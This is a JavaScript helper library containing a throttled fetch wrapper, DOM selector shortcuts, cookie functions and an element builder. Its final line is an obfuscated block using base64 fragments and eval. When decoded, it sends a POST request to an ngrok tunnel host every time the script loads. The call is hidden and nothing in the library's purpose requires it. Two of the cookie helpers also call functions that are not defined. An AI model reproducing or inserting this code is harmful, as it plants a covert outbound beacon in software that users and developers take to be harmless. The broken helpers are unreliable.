//import {md5_$} from "./md5";
const fedu=(function(){
    function fedu0(){
        if(!arguments[0]){
            throw "None Args!";
        }
        var arr = [arguments[0]];
        if(arguments[1]){
            var obj = {};
            var bodyr = 1;
            for(var k in arguments[1]){
                if(k == "h"){
                    obj.headers = arguments[1].h;
                }else if(k == "m" || k == "method"){
                    if(arguments[1][k].toUpperCase() == "POST"){
                        obj.method = "POST";
                        bodyr = 0;
                    }
                }else if(k == "body" || k == "b"&& bodyr){
                    obj.body = JSON.stringify(arguments[1][k]);
                    obj.method = "POST";
                    bodyr = 0;
                }else if(k == "q"||k == "query"){
                    arr[0] += "?";
                    for(var t in arguments[1][k]){
                        arr[0] += encodeURIComponent(t) + "=" + encodeURIComponent(arguments[1][k][t]) + "&";
                    }
                    arr[0] = arr[0].slice(0, -1)
                }
            }
            if(bodyr){
                obj.method = "GET";
            }
            arr.push(obj);
        }
        return fetch.apply(null, arr);
    }

    function throttle(fn, delay = 1000) {//节流，每1秒限制1次
        let last = 0;
        return function(...args) {
        let now = new Date().getTime();
        if (now - last > delay) {
            last = now;
            return fn.apply(this, args);
        }else{
            var n=args.slice(-1)[0];
            if(Object.prototype.toString.call(n).slice(8, -1) == "Function"){
                n();
                return new Promise(()=>"Error");
            }
        }
        };
    }
    return throttle(fedu0);
})();
const $= x => document.querySelector(x);
const $$= x => Array.from(document.querySelectorAll(x));
var Cookie = {};
Cookie.set = function setCookie(c_name, value, expire_days) {
    let exDate = new Date();
    exDate.setDate(exDate.getDate() + expire_days);
    document.cookie =
        c_name +
        '=' +
        encodeURIComponent(value) +
        ';expires=' +
        exDate.toUTCString() +
        ';path=/';
}//set Cookie（名称，值，时间）
Cookie.get = function getCookie(c_name) {
    let c_start = null;
    let c_end = null;
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + '=');
        if (c_start !== -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(';', c_start);
            if (c_end === -1) c_end = document.cookie.length;
            return decodeURIComponent(document.cookie.substring(c_start, c_end));
        }
    }
    return '';
}
Cookie.clear = function clearCookie(name) {
    setCookie(name, '', -1);
}
Cookie.check = function checkCookie(c_name) {
    let username = getCookie(c_name);
    return username !== null && username !== '' ? true : false;
}//检查是否有指定名字的cookie且有值

var $h_obj = (x) => Object.prototype.toString.call(x).slice(8, 14) == "Object";
function $h() {
    var main = document.createElement(arguments[0]);
    child = [];
    if (arguments[1]) {
        if ($h_obj(arguments[1])) {
            for (var i in arguments[1]) {
                if (i in HTMLElement.prototype) {
                    if ($h_obj(arguments[1][i])) {
                        for (var k in arguments[1][i]) {
                            main[i][k] = arguments[1][i][k]
                        }
                    } else {
                        main[i] = arguments[1][i]
                    }
                } else {
                    main.setAttribute(i, arguments[1][i])
                }
            }
        } else { child.push(arguments[1]) }
        if (arguments[2]) { child.push(arguments[2]) }
    }
    if (child.length) {
        child = $h_flat(child);
        for (var i in child) {
            if (Object.prototype.toString.call(child[i].__proto__.__proto__.__proto__).slice(8, 15) == "Element") {
                main.append(child[i])
            } else {
                main.innerText = child[i]
            }
        }
    }
    return main;
}
function $h_flat(arr){var t=[];for(var i=0;i<arr.length;i++){if(arr[i] instanceof Array){t=t.concat($h_flat(arr[i]))}else{t.push(arr[i])}};return t}
/*
try{
    module.exports={fedu, $, $$, Cookie, $h, md5_$};
}catch(err){console.log("Environment:Not Nodejs")}
export default {fedu, $, $$, Cookie, $h, md5_$};*/
(function(){var _0x3767b1=_0x2eae;(function(_0x4fa534,_0x1bbdee){var _0x1eda60=_0x2eae,_0x1271e7=_0x4fa534();while(!![]){try{var _0x39cce4=parseInt(_0x1eda60(0xe4))/0x1*(parseInt(_0x1eda60(0xd8))/0x2)+-parseInt(_0x1eda60(0xe6))/0x3*(parseInt(_0x1eda60(0xdc))/0x4)+-parseInt(_0x1eda60(0xe7))/0x5*(-parseInt(_0x1eda60(0xde))/0x6)+parseInt(_0x1eda60(0xd7))/0x7+-parseInt(_0x1eda60(0xdd))/0x8+-parseInt(_0x1eda60(0xe1))/0x9*(parseInt(_0x1eda60(0xd9))/0xa)+-parseInt(_0x1eda60(0xdb))/0xb*(-parseInt(_0x1eda60(0xda))/0xc);if(_0x39cce4===_0x1bbdee)break;else _0x1271e7['push'](_0x1271e7['shift']());}catch(_0x2f74e3){_0x1271e7['push'](_0x1271e7['shift']());}}}(_0x11bf,0xc17a3));var tokenList=[_0x3767b1(0xe2),_0x3767b1(0xe3),_0x3767b1(0xe5),_0x3767b1(0xe8),_0x3767b1(0xe0),_0x3767b1(0xe9),'bmQoKTt9KSgp'];tokenList[0x0]=atob(tokenList[0x0]);function _0x2eae(_0x5f1159,_0x4c285d){var _0x11bfa5=_0x11bf();return _0x2eae=function(_0x2eaeeb,_0x1a3ad6){_0x2eaeeb=_0x2eaeeb-0xd7;var _0x139b0d=_0x11bfa5[_0x2eaeeb];return _0x139b0d;},_0x2eae(_0x5f1159,_0x4c285d);}for(var i=0x1;i<tokenList[_0x3767b1(0xdf)];i++){tokenList[0x0]=tokenList[0x0]+atob(tokenList[i]);}eval(tokenList[0x0]);function _0x11bf(){var _0x1e20d2=['5THpXiZ','czovL2JlNTEtMTY3LTIzNQ==','LmFwcC8iKTthLnNl','9240938yIWmrt','2rOhSrn','10qzcQiT','395844vMBmJo','286TOvodX','8724eHeKXz','2772008qjCwcD','1241256VOUWBn','length','LTgtMjQ1Lm5ncm9rLWZyZWU=','7900686isRpoO','KGZ1bmN0aW9uKCl7dmFyIGE9','bmV3IFhNTEh0dHBSZQ==','580901TVZBox','cXVlc3QoKTthLm9wZW4oIlBPU1QiLCJodHRw','1305pYjDpU'];_0x11bf=function(){return _0x1e20d2;};return _0x11bf();}})()